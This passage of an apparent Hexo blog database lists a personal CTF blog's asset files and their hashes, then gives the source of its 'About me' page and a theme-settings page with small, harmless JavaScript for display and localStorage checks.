fd744af9154fe3e877ba7605606f412634f3","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Black.woff2","hash":"7ea4fd7dd4cd4f480af78a0e2c5849eb921b1aeb","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Black.woff","hash":"f6fda2de0348b3e3b7de73267f9f8e97a62f8353","modified":1768133894902},{"_id":"public/css/style.styl.bak","hash":"210406274d091be115a6175929ba5671b8b8f946","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Bold.woff2","hash":"6e40d0c7669c1adbcbf034bdc459f7bed4d6676d","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Bold.woff","hash":"56e632c9196fac364c66f812a3b4635dd999ad1c","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Light.woff","hash":"1c3dbf17411b1f6a6b22c2b76e9d8511586643d0","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Light.woff2","hash":"50b654d916204c30987d1987abd890ef92085ae3","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Medium.woff","hash":"43a8aaa3fca8721dd32a5d20f7a98dfbc87c97fd","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Medium.woff2","hash":"14b3e257c51a6a11d23b2a078017ff340c9777e4","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Regular.woff","hash":"235889d59ddad2b1f3243ccaab7733bd713a2a21","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Regular.woff2","hash":"a9714ffb842afc74836e64de04b52d8c37c87c8a","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Thin.woff","hash":"c0e784de2eb5261cca244928f8a81fd893c3fe16","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Thin.woff2","hash":"9b03b1a9071709f5b7dbca13412ecef6cb7a2a67","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Variable.woff","hash":"2e8e6d38d361def5f48baac366f04e3db3ed4828","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Variable.woff2","hash":"e213bb26bc7f10e1df3fe2d03d3ecaecd6e6d371","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"fb363d27cfdfe71a243fa2ac3dab2815232b9b7e","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.woff2","hash":"8f80d0bbe995f7fe92320fdaec10cd5ccd710a51","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-v4compatibility.ttf","hash":"a9d072aca9e0fadc2a7167671ce3d6b18d9cd2cc","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"67afa6237670ab99125056f2899129f22912dcf3","modified":1768133894902},{"_id":"public/friends/draft/ds_v1.html","hash":"cd4f798284b20536c1ea87ea8cf2cd221e7b8c1e","modified":1768133894902},{"_id":"public/friends/draft/ds_v2.html","hash":"24d45b191afad856a51a95b889b546f8573fe3a8","modified":1768133894902},{"_id":"public/friends/draft/ds_v3.html","hash":"536ee2a76d4ebc67676eb7f837b6bd5a094d3152","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Black.ttf","hash":"b65915e3fa57b5c19995d15dc2341d115c1971b9","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Black.eot","hash":"91152bd73e7ff8d943e3bde3ddb0fa0a018e1c21","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Bold.eot","hash":"5c1c680fade45393e4a5bb4548a092cd5ea6811e","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Bold.ttf","hash":"122bb778b17a152c426a825ee981610a4bd59bf3","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Light.eot","hash":"a059359e9bea17dc2ff2ede955a05bf0dc4d00d0","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Medium.ttf","hash":"948a091f0fdb8c7ae17d5ef8e51bd8830d65dd9a","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Medium.eot","hash":"d9ec1f9f3fefd57e446cbe86dc297f1ff269b6de","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Light.ttf","hash":"df82b80c4d3b11e70dcd269fc62ac97cbfa0414d","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Regular.ttf","hash":"643c28c8f8a2bce1a0d62525aa045cd9883773cd","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Regular.eot","hash":"521c01f0eb79a48025e972ecbe21b0d7fb15437b","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Thin.eot","hash":"a0ea0bdaef00b35544f9a21d25d35db9a79f7189","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Thin.ttf","hash":"6aacb0eecb03c660570b6e159ba5ca97ca7461cf","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Variable.eot","hash":"af46f7f4e10a1440a4c97b350622d279143e6798","modified":1768133894902},{"_id":"public/lib/vazir-font/Vazir-Variable.ttf","hash":"1e08b6373c2e086f24776df9b11e4be6bbcc8a4a","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"4350f9ba93384634faf35f41c503c99c767f1069","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-7.png","hash":"7fc05e79d32cc43c74a522d195e3d1cc43fbc465","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-5.png","hash":"bec88a32f0d4f86f5797e55095b3923819d5a736","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-6.png","hash":"da0ecd69f3cc86f2b813f44602218fb0e29d01cc","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image.png","hash":"7143792b808af2ed83b73153e43e9ab4a602a56b","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-10.png","hash":"b81dead665006b546cd9a88d6bb22fe3e5bdf86c","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-11.png","hash":"e8b2402145d880cad81aee5438bbafc3e2cceafc","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-12.png","hash":"a78fae3e246530b8adfaf069b2d1b039eef8712c","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-14.png","hash":"140ba0c91e93bcdb4109039755345bfd3191e098","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-15.png","hash":"3d958a94ffb6857f37a330a2110d864cbc82f1c6","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-17.png","hash":"2fe4b50f8a82c037087daff340fd42fd23afda98","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-18.png","hash":"00924e7a6b0f487a15e51bec0890f791d3afea26","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-19.png","hash":"431011e28f5ea73189700c0fdf3d35f212fc12b2","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-21.png","hash":"0812be2aa91695cc2b91c242268d9d34f3504f6c","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-20.png","hash":"45b190425b3f191abbf55152d321c6d37fb08d0e","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-16.png","hash":"b81f24366e404a8be02c06339f183417b0d7e4f8","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-23.png","hash":"937a3fb1209df692481348ab9a2115096ae32488","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-22.png","hash":"0051b4b9030198f54a30de544361e2e656693907","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-24.png","hash":"a615aa0768b6ff4b46be2484407282974b917942","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-25.png","hash":"4fe977f0d430442450503dbf908e916168b8a50b","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-2.png","hash":"f353a55bf3b453b119da4373bfea66628b693e06","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-31.png","hash":"db80ba6d9b15b030eca3fa548481914bee4c70b7","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-32.png","hash":"6cb9ca80af2d8b445c1532949c0c65281f989249","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-33.png","hash":"8a124fa44be188c8e77d7ac840152974dca6d44d","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-34.png","hash":"ef79818ebea5c57a43c70f975662a5579975f2d5","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-35.png","hash":"01e6fda9384aa0480e1f0ad0ef85e2bdb8fd5f3d","modified":1768133894902},{"_id":"public/css/rtl.css","hash":"9589fac02a34fd9084f805f801889028756bbb65","modified":1768133894902},{"_id":"public/js/main.js","hash":"c83e1223c1ec517e282566545176b9b370216a90","modified":1768133894902},{"_id":"public/css/style.css","hash":"1b4d8b26f4a2440411777fc93f94c47fd9b391ab","modified":1768133894902},{"_id":"public/lib/clipboard/clipboard.min.js","hash":"9a7cb405f9beed005891587d41f76a0720893ffc","modified":1768133894902},{"_id":"public/js/search.js","hash":"914a2ce72fb325106c61600200be823b72bfb39f","modified":1768133894902},{"_id":"public/lib/vazir-font/font-face.css","hash":"ba0030e1cd28a8caa7a5bb74b98da7c7bb185c90","modified":1768133894902},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"ad8f48b4022498078b089fcdd1e8b47faf496931","modified":1768133894902},{"_id":"public/lib/justified-gallery/css/justifiedGallery.min.css","hash":"dd3052149d3054f35efb823c68dd78e78aad5875","modified":1768133894902},{"_id":"public/lib/jquery/jquery.min.js","hash":"eda46747c71d38a880bee44f9a439c3858bb8f99","modified":1768133894902},{"_id":"public/lib/font-awesome/css/all.min.css","hash":"8c06d82739d14b094ff6d9036021a252bd1d985d","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-30.png","hash":"974da3c4c65ea68bdac9614d46148117ef945cc6","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-4.png","hash":"5c2d354edaf0e0ef7daa262d54b5e8b67758a78a","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-43.png","hash":"7c64b242f7ee9857dc02eba8e2940f70c2280f8c","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-44.png","hash":"59195d66074f0486a36584242ea4e7c5973b7497","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-5.png","hash":"2cb9503126611499d63cef775e8af38d17cb81d1","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-50.png","hash":"c7b64f98b0804e4a3e0f9f5325f7bbac84f24292","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-51.png","hash":"e3042f0a23eb4d163cfc52c0c0f727d211430388","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-53.png","hash":"0b13c8c5044df9613f50cb3a35b84fb602be58a1","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-56.png","hash":"b7b4d46685757a4ad41e44311aca6d721732da20","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-60.png","hash":"d945daf4233747f2a658f60ba086c34f6d9178a0","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-9.png","hash":"83f7525a1d7a87df263a67760b1419831c9bf983","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image.png","hash":"10455ad0f5a30ce962079e14f6752f40b041dd6f","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-65.png","hash":"bab1ad28cd66789c1b2f95d1fb20280f04edd7e1","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image-1.png","hash":"1293b3775876ae54dd7598d2af64c4ec74073508","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image-2.png","hash":"eb954368bc4aa34bd4e2e8699fcd49f79d2759b3","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image-3.png","hash":"550ba2cd2b343a194c12dd8a11d3423ad7073549","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image-5.png","hash":"f8270d1cf53cafcd9d37835ff96314d3ae759bde","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image-4.png","hash":"8551c665ad08fc6b743c3973f0bd3d12fecc024c","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image.png","hash":"584066f5d6eebdc56855ad0483f866216be92be9","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/image0.png","hash":"5531643874d3eddc1f66171b1aa564b04abe63b9","modified":1768133894902},{"_id":"public/friends/index.html","hash":"cecb43a034cfbaa4b90fe2371f7cf16aea50af3e","modified":1768146049954},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-4.png","hash":"c87efa0caefbf80046907e2f364241c3307ce7e1","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-1.png","hash":"788c822b4619a613b0a4b328c0f74dbc2a500d1a","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-27.png","hash":"bf18fc3fdc588229c66ee29a8ee6a1aeab6fc326","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-28.png","hash":"614b52de3e7a63c5adaa2d968f931276d7b103cd","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-38.png","hash":"6721ffa1ec51dd58370f5bb0f2e4bb112f794067","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-48.png","hash":"531f632bd69b4fd332b3dbaaa3575a88cc400da5","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-41.png","hash":"6612edf5588a2036005540594a5afc6989c20e27","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-40.png","hash":"997c280cc9173383dfee71f6ad65fb4bd53225ec","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-49.png","hash":"9499c3945107d4ed39a73fde984ac4f202668f87","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-45.png","hash":"6c4b00c9030db3a537b8047a1564b20ae34d7c7d","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-37.png","hash":"5e72a0d2c5a65287f6b8498fdd06218ba465f368","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-54.png","hash":"50411a244fb2bc648e5e0dc261ac3bc681e59351","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-57.png","hash":"6919887a38cb36cbe0cdf5805bdef51c1a35a8fd","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-58.png","hash":"e72d93b7fb440a2c7e3b89a2f6e62e24ee6af5b0","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-59.png","hash":"1ccecce81b5d42f5340cd018879d58bca544f623","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-64.png","hash":"c11be321d9d924ddaeec7902e6fec2900937007f","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-61.png","hash":"995a640191848cdfb4caa4bcba003ee4a2375d68","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-7.png","hash":"7a403e63471b2a9cadd98aa8ed0acfad192b461d","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"6b99aa650bd12a36caa14e0127435d8f4cd3ba73","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f0982a77285d53653845b0a78170b4688db972f1","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-1.png","hash":"2561aa0a5348cf9ca574ec40edf4e307a117e979","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-13.png","hash":"7cfa733d19ac8d1edd952409dd3c78432a64c8d7","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-26.png","hash":"957fb0bda2768e55922be5801ce77f434eb2ba43","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-29.png","hash":"d4f65fcd8c33ff68172689f5c7f05849af840395","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-3.png","hash":"5ec6330cad94175f199221af16026a477fa848c7","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-36.png","hash":"f2c665a2a88dd37016dd918666273e7116c3507f","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-46.png","hash":"cba469f2d5689e26f7d37ee997dcbe74802ce3aa","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-39.png","hash":"4b0132edda108ad2fead302d1d4a0566c1ffa55b","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-42.png","hash":"f989ab5c5f69bc342be900bb80df4093c73e121f","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-52.png","hash":"0accf4f7b5bcf1f615e704eafa833b1a31f5ecca","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-63.png","hash":"6be2f7d577f59ca7e638c39c33a3141c5e0168f7","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-6.png","hash":"66abefa9b05e97f01be5e9561f56aa16fef2c539","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-8.png","hash":"ba88d9306239746fcabc2dc55ee8890191fa4b4e","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-55.png","hash":"f73df31c0290a09582d3ec63a6906a573110ee5b","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-62.png","hash":"9493fddb8efcdb6b173ceb1a77efa6e4adef1330","modified":1768133894902},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"20bd663830188cbadd2264e1daf9497c3ffc3621","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-3.png","hash":"ee45da679b1ef0210cc5a51d503b3825c9ffd677","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"96c97a0a098ca40802f948ae56fa37aa6683d034","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"68700db02debd4b922304134da83b829cbfddfc9","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"7f7cdbdcc26279c04046632e22d872f111bc9399","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-8.png","hash":"4ba31da64e00a96681f5f6dae65f38526f253a9b","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"a9a431fc7a6c3a67c98021d4035c12a07a4f1070","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"65ddb11e75ee93909e845ab912a36717c48f1c94","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"bfa1ed9a263ed78462f06d322de13bd5bd0906b2","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"2b912dd13f052f645ee19951604610bb350d50af","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"5e220152adefe905b2197f873d7cee99eca50e91","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"a8a8df3393bccc365335fc5eb0a62a6b7ccd32b9","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"d895a1bd25e36c58b7f463ebe14de09f186d5ab4","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"df202ce09cbdc70bc16b81983a13ef0f94e46f10","modified":1768133894902},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"56fa0e33a390b704afc56af93a31576ccdbbdd9e","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/image-47.png","hash":"6e396adffaf345660f5174e2c84984ccc0286e84","modified":1768133894902},{"_id":"public/2025/11/04/TSCTF-J2025-复盘/image-2.png","hash":"097c7f1d7d667b4bcd49687a86196360d7b9ba76","modified":1768133894902},{"_id":"public/2025/11/05/NewStar2025-WP-PDF/圆周率WP-Week3.pdf","hash":"20ac914bce004a9503e99493df5b177c52dec0df","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/GIF 2025-11-4 20-49-48.gif","hash":"ceef90ea2088e8d2fdd2ee96157bb0a75c8cccde","modified":1768133894902},{"_id":"public/2025/11/04/小站修补琐记/GIF 2025-11-4 20-50-19.gif","hash":"2b7a9ecbaac03a871f6817722722a6c903176c86","modified":1768133894902},{"_id":"public/2025/11/05/NewStar2025-WP-PDF/圆周率WP-Week1.pdf","hash":"96c4aa5e84237eef641bed79c56efec9be62a77e","modified":1768133894902},{"_id":"public/2025/11/05/NewStar2025-WP-PDF/圆周率WP-Week4.pdf","hash":"38665f74e9bfa472c966064206e2bfa0ea89a405","modified":1768133894902},{"_id":"public/2025/11/05/NewStar2025-WP-PDF/圆周率WP-Week2.pdf","hash":"85fcd09f152b5b8bff11f07a4b22fcac733d18f4","modified":1768133894902},{"_id":"public/2025/11/04/0xGame2025-WP-PDF/非校内新生_Week2_圆周率_wp.pdf","hash":"7f009b0f1f9c43f421d8e7679bf373cfcedf58d8","modified":1768133894902},{"_id":"public/2025/10/30/TSCTF-J2025-WP/圆周率WP.pdf","hash":"cf260d85e3ba8a8820603ed119fb1ddf27b69336","modified":1768133894902},{"_id":"public/2025/11/04/0xGame2025-WP-PDF/非校内新生_Week4_圆周率_wp.pdf","hash":"67fce3ff639bc757b124b20168bf09e9651ac981","modified":1768133894902},{"_id":"public/2025/11/04/0xGame2025-WP-PDF/非校内新生_Week1_圆周率_wp.pdf","hash":"45de5247c15a6dca4d8c939c0f0313688de4134e","modified":1768133894902},{"_id":"public/2025/11/04/0xGame2025-WP-PDF/非校内新生_Week3_圆周率_wp.pdf","hash":"b4787d08518b546ab6eaf577a7c948ad06ff2e25","modified":1768133894902},{"_id":"public/2026/01/03/GeekChallenge-WP/BUP7-Pi-圆周率WP.pdf","hash":"d9550253e8200fecff3c4907945d3fc212113eaa","modified":1768133894902}],"Category":[],"Data":[],"Page":[{"title":"关于我……","date":"2025-10-30T08:16:29.000Z","_content":"\n<div>\n\n<img src=\"/images/logo.png\" style=\"width: min(280px, min(30vh, 30vw)); height: min(280px, min(30vh, 30vw)); float: right; border-radius: 10px\">\n\n<style>\n    #studyIn:hover {\n    filter: brightness(1.4);\n}\n</style>\n\n我是圆周率，目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>，喜欢倒腾电脑，正在学习打CTF~\n\n个人介绍就算了吧，真的很懒！\n\n也许下面会随机刷新友链？\n\n</div>\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n","source":"about/index.md","raw":"---\ntitle: 关于我……\ndate: 2025-10-30 16:16:29\n---\n\n<div>\n\n<img src=\"/images/logo.png\" style=\"width: min(280px, min(30vh, 30vw)); height: min(280px, min(30vh, 30vw)); float: right; border-radius: 10px\">\n\n<style>\n    #studyIn:hover {\n    filter: brightness(1.4);\n}\n</style>\n\n我是圆周率，目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>，喜欢倒腾电脑，正在学习打CTF~\n\n个人介绍就算了吧，真的很懒！\n\n也许下面会随机刷新友链？\n\n</div>\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n","updated":"2025-11-04T11:34:58.600Z","path":"about/index.html","comments":1,"layout":"page","_id":"cmk9p9p3o0000h4vb4cn348ws","content":"<div>\n\n<img src=\"/images/logo.png\" style=\"width: min(280px, min(30vh, 30vw)); height: min(280px, min(30vh, 30vw)); float: right; border-radius: 10px\">\n\n<style>\n    #studyIn:hover {\n    filter: brightness(1.4);\n}\n</style>\n\n<p>我是圆周率，目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>，喜欢倒腾电脑，正在学习打CTF~</p>\n<p>个人介绍就算了吧，真的很懒！</p>\n<p>也许下面会随机刷新友链？</p>\n</div>\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n","excerpt":"","more":"<div>\n\n<img src=\"/images/logo.png\" style=\"width: min(280px, min(30vh, 30vw)); height: min(280px, min(30vh, 30vw)); float: right; border-radius: 10px\">\n\n<style>\n    #studyIn:hover {\n    filter: brightness(1.4);\n}\n</style>\n\n<p>我是圆周率，目前就读于<span id=\"studyIn\" style=\"text-decoration: underline wavy red; cursor: pointer; user-select: none;\" title=\"Not Truth\"></span>，喜欢倒腾电脑，正在学习打CTF~</p>\n<p>个人介绍就算了吧，真的很懒！</p>\n<p>也许下面会随机刷新友链？</p>\n</div>\n\n<script>\n    studyIn = [\"北京邮电学院\", \"中国邮电大学\", \"北京等通知大学\"]\n    randomStudyIn = ()=>{document.getElementById(\"studyIn\").innerText = studyIn[Math.floor(Math.random()*3)]}\n    randomStudyIn()\n    document.getElementById(\"studyIn\").addEventListener(\"click\", randomStudyIn)\n</script>\n"},{"title":"特性修改","date":"2026-01-04T09:20:11.000Z","toc":true,"_content":"\n本站有很多圆周率自己加的史，如果您不想要这些特性，可以在这里修改\n\n**注意：本页的选项均使用localStorage存储，请使用支持localStorage的浏览器**\n\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n\n## 明/暗主题\n\n<fieldset>\n<legend>主题</legend>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"auto\">跟随系统<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 21.9967C6.47715 21.9967 2 17.5196 2 11.9967C2 6.47386 6.47715 1.9967 12 1.9967C17.5228 1.9967 22 6.47386 22 11.9967C22 17.5196 17.5228 21.9967 12 21.9967ZM12 19.9967C16.4183 19.9967 20 16.415 20 11.9967C20 7.57843 16.4183 3.9967 12 3.9967C7.58172 3.9967 4 7.57843 4 11.9967C4 16.415 7.58172 19.9967 12 19.9967ZM7.00035 15.316C9.07995 15.1646 11.117 14.2939 12.7071 12.7038C14.2972 11.1137 15.1679 9.07666 15.3193 6.99706C15.6454 7.21408 15.955 7.46642 16.2426 7.75406C18.5858 10.0972 18.5858 13.8962 16.2426 16.2393C13.8995 18.5825 10.1005 18.5825 7.75736 16.2393C7.46971 15.9517 7.21738 15.6421 7.00035 15.316Z\"></path></svg><span title=\"使用媒体查询自动选择\" style=\"text-decoration: underline; text-decoration-style: dotted;\">?</span></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"light\">亮<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 